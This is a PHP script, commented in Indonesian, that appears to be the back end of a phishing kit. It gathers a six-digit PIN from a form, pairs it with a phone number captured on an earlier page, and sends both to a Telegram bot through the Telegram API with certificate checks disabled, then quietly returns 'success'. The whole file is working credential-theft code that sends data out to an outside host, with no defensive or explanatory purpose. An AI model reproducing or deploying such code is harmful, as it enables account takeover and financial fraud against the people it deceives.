<?php
/*
 * File: req/two.php
 * Deskripsi: Mengirim kode PIN 6 digit ke Telegram
 */

include "../telegram.php"; 
session_start();

// Pastikan data dikirim melalui metode POST
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    
    // Ambil 6 digit PIN dari input (pin1 sampai pin6)
    $p1 = isset($_POST['pin1']) ? $_POST['pin1'] : '';
    $p2 = isset($_POST['pin2']) ? $_POST['pin2'] : '';
    $p3 = isset($_POST['pin3']) ? $_POST['pin3'] : '';
    $p4 = isset($_POST['pin4']) ? $_POST['pin4'] : '';
    $p5 = isset($_POST['pin5']) ? $_POST['pin5'] : '';
    $p6 = isset($_POST['pin6']) ? $_POST['pin6'] : '';
    
    // Gabungkan menjadi satu string PIN utuh
    $full_pin = $p1 . $p2 . $p3 . $p4 . $p5 . $p6;
    
    // Ambil nomor HP dari session yang diisi di one.php sebelumnya
    $nohp = isset($_SESSION['nohp']) ? $_SESSION['nohp'] : 'Tidak Ada Nomor';

    // Format pesan Telegram (Bersih & Tanpa IP)
    $message = "🔐 *PIN DITERIMA*\n";
    $message .= "──────────────────\n";
    $message .= "📱 *Nomor HP:* `" . $nohp . "`\n";
    $message .= "🔢 *PIN:* `" . $full_pin . "`\n";
    $message .= "⏰ *Waktu:* " . date('d-m-Y H:i:s') . "\n";
    $message .= "──────────────────";

    // Fungsi kirim data ke Telegram menggunakan cURL
    function sendMessage($id_telegram, $message, $id_botTele) {
        $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage";
        $data = [
            'chat_id' => $id_telegram,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    // Eksekusi pengiriman ke Telegram
    sendMessage($id_telegram, $message, $id_botTele);

    // Kirim respon balik ke AJAX
    echo "success";
    exit();

} else {
    // Jika diakses langsung tanpa kirim data PIN
    header('Location: ../index.php');
    exit();
}
?>
